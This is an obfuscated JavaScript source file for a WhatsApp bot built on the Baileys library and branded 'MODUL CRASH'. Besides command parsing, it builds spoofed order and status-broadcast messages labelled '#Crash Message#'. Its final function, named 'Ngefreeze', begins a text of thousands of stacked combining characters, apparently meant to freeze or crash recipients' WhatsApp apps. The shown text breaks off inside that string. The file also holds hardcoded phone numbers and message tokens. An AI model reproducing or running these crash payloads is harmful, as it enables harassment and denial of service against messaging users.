require("./cursss");
const fs = require("fs");
const axios = require("axios");
const chalk = require("chalk");
const jimp = require("jimp");
const util = require("util");
const ms = require("parse-ms");
const fetch = require("node-fetch");
const JsConfuser = require("js-confuser");
const moment = require("moment-timezone");
const {
  spawn,
  exec,
  execSync
} = require("child_process");
const {
  default: baileys,
  proto,
  generateWAMessage,
  generateWAMessageFromContent,
  getContentType,
  prepareWAMessageMedia,
  downloadContentFromMessage
} = require("@whiskeysockets/baileys");
module.exports = sock = async (_0x40d3ea, _0x122228, _0x1f5e09, _0x51b028) => {
  try {
    const _0x41274a = _0x122228.mtype === "conversation" ? _0x122228.message.conversation : _0x122228.mtype === "imageMessage" ? _0x122228.message.imageMessage.caption : _0x122228.mtype === "videoMessage" ? _0x122228.message.videoMessage.caption : _0x122228.mtype === "extendedTextMessage" ? _0x122228.message.extendedTextMessage.text : _0x122228.mtype === "buttonsResponseMessage" ? _0x122228.message.buttonsResponseMessage.selectedButtonId : _0x122228.mtype === "listResponseMessage" ? _0x122228.message.listResponseMessage.singleSelectReply.selectedRowId : _0x122228.mtype === "templateButtonReplyMessage" ? _0x122228.message.templateButtonReplyMessage.selectedId : _0x122228.mtype === "interactiveResponseMessage" ? JSON.parse(_0x122228.msg.nativeFlowResponseMessage.paramsJson).id : _0x122228.mtype === "templateButtonReplyMessage" ? _0x122228.msg.selectedId : _0x122228.mtype === "messageContextInfo" ? _0x122228.message.buttonsResponseMessage?.selectedButtonId || _0x122228.message.listResponseMessage?.singleSelectReply.selectedRowId || _0x122228.text : "";
    const _0x51b80a = _0x122228.key.fromMe ? _0x40d3ea.user.id.split(":")[0] + "@s.whatsapp.net" || _0x40d3ea.user.id : _0x122228.key.participant || _0x122228.key.remoteJid;
    const _0x2f6f28 = _0x51b80a.split("@")[0];
    const _0x2be380 = typeof _0x122228.text === "string" ? _0x122228.text : "";
    const _0x412d59 = ["", "!", ".", ",", "🐤", "🗿"];
    const _0x539711 = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><™©®Δ^βα¦|/\\©^]/.test(_0x41274a) ? _0x41274a.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!™©®Δ^βα¦|/\\©^]/gi) : ".";
    const _0x16b374 = _0x122228.key.remoteJid;
    const _0x21cfe6 = _0x16b374.endsWith("@g.us");
    const _0x34c793 = JSON.parse(fs.readFileSync("./Database/lib/database/owner.json"));
    const _0x3c973b = await _0x40d3ea.decodeJid(_0x40d3ea.user.id);
    const _0x5e5de3 = [_0x3c973b, ..._0x34c793, ...global.owner].map(_0x1b2ed2 => _0x1b2ed2.replace(/[^0-9]/g, "") + "@s.whatsapp.net").includes(_0x122228.sender);
    const _0xe67666 = _0x41274a.startsWith(_0x539711);
    const _0x5e99b8 = _0x41274a.slice(1).trim().split(/ +/).shift().toLowerCase();
    const _0x1a8c93 = _0x41274a.trim().split(/ +/).slice(1);
    const _0x4f3f06 = _0x122228.pushName || "No Name";
    const _0x8ab39f = q = _0x1a8c93.join(" ");
    const _0xd11ef4 = _0x122228.quoted ? _0x122228.quoted : _0x122228;
    const _0x3f26b1 = (_0xd11ef4.msg || _0xd11ef4).mimetype || "";
    const _0x89651 = _0xd11ef4.msg || _0xd11ef4;
    const _0x5b631d = /image|video|sticker|audio/.test(_0x3f26b1);
    const _0x4eb3ef = _0x21cfe6 ? await _0x40d3ea.groupMetadata(_0x122228.chat).catch(_0x3db255 => {}) : "";
    const _0x4b391a = _0x21cfe6 ? _0x4eb3ef.owner : "";
    const _0x31e722 = _0x122228.isGroup ? _0x4eb3ef.subject : "";
    const _0xaa272c = _0x21cfe6 ? await _0x4eb3ef.participants : "";
    const _0xc9c328 = _0x21cfe6 ? await _0xaa272c.filter(_0x411705 => _0x411705.admin !== null).map(_0x11ab35 => _0x11ab35.id) : "";
    const _0x251380 = _0x21cfe6 ? _0x4eb3ef.participants : "";
    const _0x4a8bc6 = _0x21cfe6 ? _0xc9c328.includes(_0x122228.sender) : false;
    const _0x112aa9 = _0x21cfe6 ? _0xc9c328.includes(_0x3c973b) : false;
    const _0x263a0e = _0x21cfe6 ? _0xc9c328.includes(_0x3c973b) : false;
    const _0x2e5154 = _0x21cfe6 ? _0xc9c328.includes(_0x122228.sender) : false;
    const {
      smsg: _0x3c7e1e,
      sendGmail: _0x232abd,
      formatSize: _0x1688d9,
      isUrl: _0x5e2f49,
      generateMessageTag: _0x171a3c,
      getBuffer: _0x4fdf22,
      getSizeMedia: _0x37894b,
      runtime: _0x8af37d,
      fetchJson: _0x6d879,
      sleep: _0x387e39
    } = require("./Database/lib/myfunction");
    const _0x4743f9 = require("./Database/lib/premium");
    const _0x46588c = _0x5e5de3 ? true : _0x4743f9.checkPremiumUser(_0x122228.sender);
    const {
      pickRandom: _0x4db59d,
      toIDR: _0x332e25,
      capital: _0xfd5440
    } = require("./library/function");
    const _0x2581dc = fs.readFileSync("./gallery/curserd.jpeg");
    const _0x5dd251 = fs.readFileSync("./gallery/korupt.mp3");
    const _0xd924e6 = ["https://files.catbox.moe/dy3xm7.jpg", "https://files.catbox.moe/dy3xm7.jpg", "https://files.catbox.moe/dy3xm7.jpg", "https://files.catbox.moe/dy3xm7.jpg", "https://files.catbox.moe/dy3xm7.jpg", "https://files.catbox.moe/dy3xm7.jpg"];
    const _0x372183 = _0xd924e6[Math.floor(Math.random() * _0xd924e6.length)];
    const _0x21f407 = moment.tz("Asia/Makassar").format("HH:mm:ss");
    if (_0x122228.message) {
      console.log("[30m--------------------[0m");
      console.log(chalk.bgHex("#e74c3c").bold("𝕸𝕺𝕯𝖀𝕷 𝕮𝕽𝕬𝕾𝕳"));
      console.log(chalk.bgHex("#FF0000").black("  👤 Tanggal: " + new Date().toLocaleString() + " \n" + ("  👤 Chat: " + (_0x122228.body || _0x122228.mtype) + " \n") + ("  👤 Number: " + _0x2f6f28)));
      if (_0x122228.isGroup) {
        console.log(chalk.bgHex("#FF0000").black("   👤 Grup: " + _0x31e722 + " \n" + ("   👤 GroupJid: " + _0x122228.chat)));
      }
      console.log();
    }
    let _0x484185 = async (_0x5291f0, _0x570e64, _0x1cf1ed) => {
      let _0x4d1499 = await jimp.read(_0x5291f0);
      let _0x7e3923 = await _0x4d1499.resize(_0x570e64, _0x1cf1ed).getBufferAsync(jimp.MIME_JPEG);
      return _0x7e3923;
    };
    const _0x1c5e84 = {
      orderId: "2009",
      thumbnail: _0x2581dc,
      itemCount: "333333",
      status: "INQUIRY",
      surface: "",
      message: "ＭＯＤＵＬ ＣＲＡＳＨ V1̤ͅ",
      token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
    };
    const _0x3feb0e = {
      orderMessage: _0x1c5e84
    };
    const _0x57ae4b = {
      key: {
        fromMe: false,
        participant: "0@s.whatsapp.net",
        remoteJid: "status@broadcast"
      },
      message: _0x3feb0e,
      contextInfo: {
        mentionedJid: ["120363378510313540@s.whatsapp.net"],
        forwardingScore: 999,
        isForwarded: true
      }
    };
    const _0x3b5ff7 = _0x57ae4b;
    const _0x3c3d87 = {
      participant: "0@s.whatsapp.net",
      ...(_0x122228.chat ? {
        remoteJid: "status@broadcast"
      } : {})
    };
    const _0x2cc91d = {
      caption: botname + " ᏰᎽ " + developer,
      jpegThumbnail: ""
    };
    const _0x45d63c = {
      liveLocationMessage: _0x2cc91d
    };
    const _0x427692 = {
      key: _0x3c3d87,
      message: _0x45d63c
    };
    const _0x449ec9 = _0x427692;
    const _0x321efd = {
      key: {
        fromMe: false,
        participant: "0@s.whatsapp.net",
        remoteJid: "status@broadcast"
      },
      message: {
        orderMessage: {
          orderId: "2009",
          thumbnail: _0x2581dc,
          itemCount: "50000",
          status: "INQUIRY",
          surface: "CATALOG",
          message: "Sender : @" + _0x122228.sender.split("@")[0] + "\nCommand : " + _0x5e99b8,
          token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
        }
      },
      contextInfo: {
        mentionedJid: ["120363378510313540@s.whatsapp.net"],
        forwardingScore: 999,
        isForwarded: true
      }
    };
    async function _0x328e3e() {
      var _0x3f2fc1 = ["⁂𝐎𝐧𝐞", "⁂𝐓𝐰𝐨", "⁂𝐓𝐡𝐫𝐞𝐞", "𝐖𝐄𝐋𝐂𝐎𝐌𝐄", "ＭＯＤＵＬ ＣＲＡＳＨ"];
      let {
        key: _0xdc3cdc
      } = await _0x40d3ea.sendMessage(_0x16b374, {
        text: "ЇЙѴА$ЇѲЙ"
      });
      for (let _0xd1c078 = 0; _0xd1c078 < _0x3f2fc1.length; _0xd1c078++) {
        const _0x1fd87d = {
          text: _0x3f2fc1[_0xd1c078],
          edit: _0xdc3cdc
        };
        await _0x40d3ea.sendMessage(_0x16b374, _0x1fd87d);
      }
    }
    const _0x4d86cf = _0x2f029a => {
      const _0x4ef53f = {
        text: _0x2f029a,
        contextInfo: {
          externalAdReply: {
            showAdAttribution: true,
            title: "MODUL",
            body: "ＭＯＤＵＬ ＣＲＡＳＨ͎̳͎",
            mediaType: 3,
            renderLargerThumbnail: false,
            thumbnailUrl: "https://files.catbox.moe/dat7cz.jpg",
            sourceUrl: "https://whatsapp.com/channel/0029VazqfJY8KMqqrvHFrv0Y"
          }
        }
      };
      const _0x855712 = {
        quoted: _0x3b5ff7
      };
      return _0x40d3ea.sendMessage(_0x122228.chat, _0x4ef53f, _0x855712);
    };
    const _0x3be880 = "https://files.catbox.moe/dy3xm7.jpg";
    const _0x2243cc = {
      fromMe: false,
      participant: "0@s.whatsapp.net",
      ...(_0x16b374 ? {
        remoteJid: "@s.whatsapp.net"
      } : {})
    };
    const _0x4a8840 = {
      orderId: "594071395007984",
      thumbnail: {},
      itemCount: 10000,
      status: "INQUIRY",
      surface: "CATALOG",
      message: "Command : " + _0x5e99b8,
      orderTitle: " THEFLASH New",
      sellerJid: "6285765334291@s.whatsapp.net",
      token: "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
      totalAmount1000: "10000",
      totalCurrencyCode: "IDR"
    };
    _0x4a8840.thumbnail.url = "https://files.catbox.moe/dat7cz.jpg";
    const _0x8eb4e1 = {
      orderMessage: _0x4a8840
    };
    const _0x51f301 = {
      key: _0x2243cc,
      message: _0x8eb4e1
    };
    const _0x2d4b08 = _0x51f301;
    const _0x3a538d = {
      fromMe: false,
      participant: "0@s.whatsapp.net",
      ...(_0x16b374 ? {
        remoteJid: "@s.whatsapp.net"
      } : {})
    };
    const _0x29ca0c = {
      orderId: "594071395007984",
      thumbnail: {},
      itemCount: 2009,
      status: "INQUIRY",
      surface: "CATALOG",
      message: "! #Crash Message# !",
      orderTitle: " ZoroWoii",
      sellerJid: "6285727819741@s.whatsapp.net",
      token: "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
      totalAmount1000: "2009",
      totalCurrencyCode: "IDR"
    };
    _0x29ca0c.thumbnail.url = "https://h.top4top.io/p_3301ml5m70.jpg";
    const _0x2ba08a = {
      orderMessage: _0x29ca0c
    };
    const _0x134e9e = {
      key: _0x3a538d,
      message: _0x2ba08a
    };
    const _0x5b1f49 = _0x134e9e;
    const _0x25a548 = {
      key: {
        participant: "0@s.whatsapp.net",
        remoteJid: "status@broadcast",
        fromMe: false,
        id: "Halo"
      },
      message: {
        locationMessage: {
          name: "イNoCounter!!",
          jpegThumbnail: ""
        }
      }
    };
    const _0x1a1eaf = _0x36dc56 => {
      const _0x59df2a = {
        text: _0x36dc56,
        contextInfo: {
          externalAdReply: {
            showAdAttribution: true,
            title: "New",
            body: "𒆜KapotID!!!",
            mediaType: 3,
            renderLargerThumbnail: false,
            thumbnailUrl: "https://files.catbox.moe/dat7cz.jpg",
            sourceUrl: "https://youtube.com/"
          }
        }
      };
      const _0x5983ee = {
        quoted: _0x3b5ff7
      };
      return _0x40d3ea.sendMessage(_0x122228.chat, _0x59df2a, _0x5983ee);
    };
    const _0x5efff6 = async _0xebe146 => {
      return _0x40d3ea.sendMessage(_0x122228.chat, {
        contextInfo: {
          mentionedJid: [_0x122228.sender],
          externalAdReply: {
            showAdAttribution: true,
            renderLargerThumbnail: false,
            title: "ᖫME PROᖭ",
            body: "MODUL V1͟",
            previewType: "FOTO",
            thumbnail: "https://files.catbox.moe/dat7cz.jpg",
            sourceUrl: "w.me//6285765334291",
            mediaUrl: "https://whatsapp.com/channel/0029VazqfJY8KMqqrvHFrv0Y"
          }
        },
        text: _0xebe146
      }, {
        quoted: _0x122228
      });
    };
    async function _0x28b822(_0x41be41, _0x34feb0, _0x23bd70 = true) {
      let _0x42fbb6 = "Ngefreeze ҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝